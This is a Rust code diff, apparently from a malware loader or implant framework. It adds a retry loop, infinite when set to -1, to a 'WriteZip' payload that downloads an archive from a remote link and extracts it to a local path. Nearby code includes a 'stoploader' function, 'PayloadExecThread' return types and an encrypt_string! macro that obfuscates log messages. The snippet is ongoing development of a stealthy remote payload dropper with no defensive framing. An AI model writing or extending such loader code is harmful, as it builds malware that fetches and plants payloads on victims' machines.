@@ -325,16 +325,37 @@ pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
 pub struct WriteZip {
     pub link: Link,
     pub path: String,
+    pub retry: i32, //-1 infinite; pour le download
     pub runonce: bool,
+    //TODO thread
 }
 
 impl WriteZip {
     pub fn write_zip(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
+
+        //let archive: Vec<u8> = self.link.fetch_data(config)?;
+        let mut retries = self.retry;
+        let archive: Vec<u8> = loop {
+            match self.link.fetch_data(config) {
+                Ok(data) => break data,
+                Err(e) => {
+                    error!(
+                        "retry={}/{} Fail fetch_data {:?}",
+                        retries, self.retry, self.link
+                    );
+                    if retries == 0 {
+                        return Err(e);
+                    } else if retries > 0 {
+                        retries -= 1;
+                    }
+                    // sinon, retry == -1, on continue indéfiniment
+                }
+            }
+        };
+
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
-
-        let archive: Vec<u8> = self.link.fetch_data(config)?;
 
         info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
         match zip_extract::extract(Cursor::new(archive), &path, true) {
